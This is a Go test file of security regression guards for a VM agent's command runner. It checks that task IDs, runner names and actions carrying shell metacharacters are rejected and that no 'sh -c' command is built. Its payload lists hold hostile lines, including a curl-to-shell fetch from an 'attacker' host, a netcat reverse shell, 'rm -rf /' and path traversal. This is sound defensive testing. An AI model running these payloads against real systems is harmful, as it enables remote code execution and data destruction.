// SEC-004 regression guards for the Go runner.
//
// These tests lock in the shell-injection fixes: the default resolver must
// reject cloud-supplied metacharacters in task_id / runner / action,
// never build a command via `sh -c`, and refuse runners outside the
// hardcoded allowlist.
//
// See:
package runner

import (
	"context"
	"strings"
	"testing"

	"github.com/primorLee/agent-workflow-platform/services/vm-agent/internal/protocol"
)

// TestSEC004_ValidateOfferRejectsShellMetachars is the canonical regression
// guard referenced by tests/security/test_SEC_004.py. It enumerates the
// injection payloads most likely to appear in an attack: command chaining,
// subshell, pipe, backtick, redirect, null byte, newline, whitespace.
func TestSEC004_ValidateOfferRejectsShellMetachars(t *testing.T) {
	malicious := []string{
		`"; rm -rf /tmp`,
		`; curl http://attacker/|sh`,
		`$(whoami)`,
		"`id`",
		`a && nc -e /bin/sh attacker 4444`,
		`a | tee /tmp/pwn`,
		`a > /etc/passwd`,
		"a\nrm -rf /",
		"a\x00b",
		"a b",
		strings.Repeat("a", 65), // length-bound
		"",                      // empty
		"../../etc/passwd",      // path-traversal shape
		"a/b",
		"a\\b",
		"a\t",
	}

	for _, bad := range malicious {
		offer := &protocol.TaskOfferPayload{
			TaskID:    bad,
			Execution: protocol.ExecutionSpec{Runner: "echo", Action: "ac"},
		}
		if err := validateOffer(offer); err == nil {
			t.Errorf("validateOffer accepted malicious TaskID %q — expected rejection", bad)
		}
		// Also exercise the public resolver path — it must not return a cmd
		// when the task_id is tainted.
		if cmd, err := defaultCommandResolver(context.Background(), offer); err == nil {
			t.Errorf("defaultCommandResolver produced cmd for malicious TaskID %q: %+v", bad, cmd)
		}
	}
}

// TestSEC004_ValidateOfferAcceptsValidInputs is the positive control: legit
// task_ids must pass so we do not break the happy path.
func TestSEC004_ValidateOfferAcceptsValidInputs(t *testing.T) {
	good := []string{
		"t1",
		"task-123",
		"Task_42",
		"abc",
		"TASK-1234-5678",
		strings.Repeat("a", 64), // max length
	}
	for _, ok := range good {
		offer := &protocol.TaskOfferPayload{
			TaskID:    ok,
			Execution: protocol.ExecutionSpec{Runner: "echo", Action: "ac"},
		}
		if err := validateOffer(offer); err != nil {
			t.Errorf("validateOffer rejected valid TaskID %q: %v", ok, err)
		}
	}
}

// TestSEC004_UnknownRunnerRejected ensures the allowlist is the real gate:
// syntactically valid runner strings that are not sanctioned must fail.
func TestSEC004_UnknownRunnerRejected(t *testing.T) {
	cases := []string{
		"python",    // valid identifier, not in allowlist
		"node",      // valid identifier, not in allowlist
		"echo-evil", // lookalike
		"ECHO",      // case mismatch
		"echo ",     // trailing space (also fails ident regex)
	}
	for _, eng := range cases {
		offer := &protocol.TaskOfferPayload{
			TaskID:    "t1",
			Execution: protocol.ExecutionSpec{Runner: eng, Action: "ac"},
		}
		if err := validateOffer(offer); err == nil {
			t.Errorf("validateOffer accepted unknown runner %q", eng)
		}
	}
}

// TestSEC004_AllowedRunnersPopulated guards against someone accidentally
// emptying the allowlist during a refactor — a zero-entry map would make
// every runner rejected but also removes the explicit security contract.
func TestSEC004_AllowedRunnersPopulated(t *testing.T) {
	required := []string{"echo"}
	for _, r := range required {
		bin, ok := allowedRunners[r]
		if !ok {
			t.Errorf("allowedRunners missing required runner %q", r)
			continue
		}
		if !strings.HasPrefix(bin, "/") {
			t.Errorf("allowedRunners[%q] = %q: expected absolute path", r, bin)
		}
	}
}

// TestSEC004_ResolveRunnerBinary checks the runner→binary helper in both
// directions: sanctioned runner returns the hardcoded path; anything else
// errors.
func TestSEC004_ResolveRunnerBinary(t *testing.T) {
	bin, err := resolveRunnerBinary("echo")
	if err != nil {
		t.Fatalf("resolveRunnerBinary(echo) unexpected error: %v", err)
	}
	if bin != allowedRunners["echo"] {
		t.Errorf("resolveRunnerBinary(echo) = %q, want %q", bin, allowedRunners["echo"])
	}
	if _, err := resolveRunnerBinary("python"); err == nil {
		t.Errorf("resolveRunnerBinary(python) returned no error — allowlist bypass")
	}
	if _, err := resolveRunnerBinary(""); err == nil {
		t.Errorf("resolveRunnerBinary(\"\") returned no error")
	}
	if _, err := resolveRunnerBinary("echo;ls"); err == nil {
		t.Errorf("resolveRunnerBinary accepted metacharacter-laden runner")
	}
}

// TestSEC004_SanitizeTaskIDContract covers the single-string sanitizer
// directly so callers that use it without the full offer still get
// consistent behaviour.
func TestSEC004_SanitizeTaskIDContract(t *testing.T) {
	okCases := []string{"a", "t1", "task-123", "Task_42", strings.Repeat("x", 64)}
	for _, s := range okCases {
		got, err := sanitizeTaskID(s)
		if err != nil {
			t.Errorf("sanitizeTaskID(%q) unexpected error: %v", s, err)
		}
		if got != s {
			t.Errorf("sanitizeTaskID(%q) = %q, want %q", s, got, s)
		}
	}
	badCases := []string{
		"",
		strings.Repeat("x", 65),
		"a.b", // '.' not allowed in task_id (stricter than ident)
		"a:b", // ':' not allowed in task_id
		"a b",
		"a;b",
		"a|b",
		"a$b",
		"a`b",
		"a/b",
		"../x",
		"a\x00",
		"a\n",
		"a\t",
	}
	for _, s := range badCases {
		if _, err := sanitizeTaskID(s); err == nil {
			t.Errorf("sanitizeTaskID(%q) accepted — expected rejection", s)
		}
	}
}

// TestSEC004_DefaultResolverReturnsEchoNotShell is a structural guard: the
// default resolver must build an `echo` cmd, NOT `sh -c`.
func TestSEC004_DefaultResolverReturnsEchoNotShell(t *testing.T) {
	offer := &protocol.TaskOfferPayload{
		TaskID:    "t1",
		Execution: protocol.ExecutionSpec{Runner: "echo", Action: "ac"},
	}
	cmd, err := defaultCommandResolver(context.Background(), offer)
	if err != nil {
		t.Fatalf("defaultCommandResolver unexpected error: %v", err)
	}
	if cmd == nil {
		t.Fatal("defaultCommandResolver returned nil cmd")
	}
	if len(cmd.Args) == 0 {
		t.Fatal("defaultCommandResolver produced cmd with no Args")
	}
	// Args[0] is the executable name; must be echo, never sh.
	if cmd.Args[0] == "sh" || strings.HasSuffix(cmd.Args[0], "/sh") {
		t.Errorf("defaultCommandResolver still uses a shell: Args=%v", cmd.Args)
	}
	// None of the argv entries should contain the original fmt.Sprintf
	// script fragments — those indicate the pre-patch code path.
	for _, a := range cmd.Args {
		if strings.Contains(a, "-c") && strings.Contains(a, "echo awp-vm-agent placeholder;") {
			t.Errorf("defaultCommandResolver argv contains shell script: %q", a)
		}
	}
}

// TestSEC004_ActionValidated confirms action is checked too —
// it's the third cloud-supplied field that previously flowed into sh -c.
func TestSEC004_ActionValidated(t *testing.T) {
	offer := &protocol.TaskOfferPayload{
		TaskID:    "t1",
		Execution: protocol.ExecutionSpec{Runner: "echo", Action: `ac; rm -rf /`},
	}
	if err := validateOffer(offer); err == nil {
		t.Errorf("validateOffer accepted malicious action")
	}
}
